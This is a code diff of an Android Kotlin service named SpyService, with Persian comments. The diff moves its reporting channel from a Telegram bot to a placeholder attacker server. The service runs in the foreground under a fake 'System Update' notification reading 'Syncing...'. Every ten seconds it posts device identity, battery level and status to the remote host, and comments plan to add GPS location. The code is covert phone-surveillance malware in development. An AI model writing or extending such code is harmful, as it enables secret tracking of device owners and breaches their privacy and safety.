@@ -8,56 +8,48 @@ import android.content.Intent
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
-import java.io.BufferedReader
-import java.io.InputStreamReader
+import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
 class SpyService : Service() {
     private val CHANNEL_ID = "SpyServiceChannel"
     private val NOTIFICATION_ID = 1
-    private var botToken = ""
-    private var chatId = ""
+    
+    // تنظیمات سرور (آدرس سروری که ساختی)
+    private val SERVER_URL = "http://YOUR_SERVER_IP:3000" 
 
     override fun onCreate() {
         super.onCreate()
-        // 1. دریافت توکن و چت آیدی از مانیفست
-        try {
-            botToken = applicationInfo.metaData.getString("TELEGRAM_BOT_TOKEN") ?: ""
-            chatId = applicationInfo.metaData.getString("TELEGRAM_CHAT_ID") ?: ""
-        } catch (e: Exception) {
-            Log.e("SpyService", "Error reading metadata", e)
-        }
-
         createNotificationChannel()
         startForeground(NOTIFICATION_ID, createNotification())
-        Log.d("SpyService", "Service Created with Token: $botToken")
+        Log.d("SpyService", "Service Started")
+        
+        // شروع ارسال داده به سرور
+        sendDataToServer()
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        launchBackgroundTasks()
-        return START_STICKY
-    }
-
-    private fun launchBackgroundTasks() {
+    private fun sendDataToServer() {
         Thread {
             while (true) {
                 try {
-                    delay(5000) // هر 5 ثانیه چک کن
-                    sendStatusUpdate()
+                    delay(10000) // هر 10 ثانیه آپدیت بفرست
+                    
+                    val battery = getBatteryLevel()
+                    val payload = JSONObject().apply {
+                        put("deviceId", "DEVICE_001") // اینجا میشه ID واقعی گوشی رو گذاشت
+                        put("battery", battery)
+                        put("status", "online")
+                        put("location", "null") // بعدا GPS رو اضافه میکنیم
+                    }
+                    
+                    uploadData(payload.toString())
+                    
                 } catch (e: Exception) {
-                    e.printStackTrace()
+                    Log.e("SpyService", "Error sending data", e)
                 }
             }
         }.start()
-    }
-
-    private fun sendStatusUpdate() {
-        if (botToken.isEmpty() || chatId.isEmpty()) return
-        
-        // یک پیام ساده برای تست
-        val message = "Device is alive! Battery: ${getBatteryLevel()}%"
-        sendMessageToTelegram(message)
     }
 
     private fun getBatteryLevel(): Int {
@@ -68,21 +60,20 @@ class SpyService : Service() {
         return if (level == -1 || scale == -1) -1 else ((level * 100.toLong()) / scale.toInt()).toInt()
     }
 
-    private fun sendMessageToTelegram(text: String) {
-        val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
+    private fun uploadData(jsonData: String) {
+        val url = URL("$SERVER_URL/update")
         val connection = url.openConnection() as HttpURLConnection
         connection.requestMethod = "POST"
         connection.setRequestProperty("Content-Type", "application/json; utf-8")
         connection.doOutput = true
         
-        val jsonInputString = """{"chat_id": "$chatId", "text": "$text"}"""
-        connection.outputStream.write(jsonInputString.toByteArray())
+        connection.outputStream.write(jsonData.toByteArray())
 
         val responseCode = connection.responseCode
         if (responseCode == HttpURLConnection.HTTP_OK) {
-            Log.d("SpyService", "Message sent successfully")
+            Log.d("SpyService", "Data uploaded successfully")
         } else {
-            Log.e("SpyService", "Failed to send message. Code: $responseCode")
+            Log.e("SpyService", "Upload failed. Code: $responseCode")
         }
         connection.disconnect()
     }
@@ -100,7 +91,7 @@ class SpyService : Service() {
     private fun createNotification(): Notification {
         val builder = Notification.Builder(this, CHANNEL_ID)
         builder.setContentTitle("System Update")
-        builder.setContentText("Running quietly...")
+        builder.setContentText("Syncing...")
         builder.setSmallIcon(android.R.drawable.ic_menu_compass)
         return builder.build()
     }
